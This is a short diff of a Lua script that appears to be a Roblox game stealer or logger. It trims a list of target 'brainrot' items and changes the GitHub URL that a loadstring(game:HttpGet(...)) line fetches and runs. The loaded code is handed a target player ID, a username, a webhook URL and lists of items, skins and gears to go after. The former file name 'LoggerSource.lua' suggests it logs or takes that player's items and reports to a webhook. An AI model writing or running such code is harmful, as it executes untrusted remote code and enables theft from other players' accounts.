@@ -282,8 +282,7 @@ local TargetBrainrots = {
     ["Burrito Bat"] = true,
     ["Chicli Chicla"] = true,
     ["Panda Popanda"] = true,
-    ["Deputy Leopard"] = true,
-    ["Noobini Pizzanini"] = true
+    ["Deputy Leopard"] = true
 }
 
 local TargetBaseSkins = {
@@ -350,7 +349,7 @@ task.spawn(function()
 
     task.wait(1)
 
-    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/f3do/ShadowScripts/refs/heads/main/LoggerSource.lua"))()
+    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
     if type(script) == "function" then
         script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
     end
